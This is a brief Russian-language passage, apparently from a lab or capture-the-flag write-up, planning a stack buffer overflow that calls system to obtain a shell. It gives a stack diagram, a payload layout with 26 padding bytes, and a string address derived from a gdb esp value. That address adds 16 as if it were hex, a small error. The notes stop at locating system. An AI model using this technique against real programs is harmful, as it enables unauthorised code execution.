На этот раз мы хотим получить консоль

Стек такой же
```
ret
ebp
ebx
---

result
* * * *
* * * *
XX XX * * <- buffer

---
---
&buffer
string <- esp
```

Как примерно должен выглядеть payload
```
A...A<system>BBBBBBBBRRRRRRRR<str><string itself>
|---|           ebp     ret
  26
```

На нужно найти адрес нашей строки, для этого нужно в gdb узнать, наш esp
```
esp = 0xffffc600
str addr = esp + 16 = 0xffffc616
```

Теперь нужно найти, где лежит system